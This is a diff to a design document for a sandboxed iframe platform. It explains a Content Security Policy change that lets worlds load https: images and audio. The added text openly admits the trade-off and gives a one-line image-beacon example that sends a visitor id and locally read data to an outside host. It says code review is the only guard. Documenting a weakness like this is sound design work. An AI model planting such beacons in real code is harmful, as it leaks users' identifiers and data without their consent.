@@ -197,9 +197,17 @@ session. The CSP sets `connect-src 'none'`: a world cannot open a channel of its
 own, and every read and write goes through the host's allowlisted postMessage
 proxy, which holds the credential.
 
-`img-src` and `media-src` allow `data:`, which is looser than the game-view
-policy. That is deliberate: games lock `img-src` down because a hidden-info
-game's frame contains a viewer's secrets, and a world renders nothing private.
+`img-src` and `media-src` allow `data:` **and `https:`**, which is looser than the
+game-view policy. That is deliberate — a hidden-info game's frame holds a
+viewer's secret hand, and a world's records are public co-created content, so
+allowing real images and audio costs nothing comparable and is what lets a world
+look and sound like itself.
+
+Be exact about the trade, though: `connect-src 'none'` does not cover images, so
+`new Image().src = 'https://elsewhere/?' + ctx.me.id` does reach the network. A
+world *can* post out the visitor id and whatever it read from `ctx.local`. Nothing
+technical stops it — what stops it is that worlds are read before they ship. Don't
+do it; a beacon in a reviewed diff is visible, and it is grounds for rejection.
 
 Audio therefore works two ways, both without a network:
 
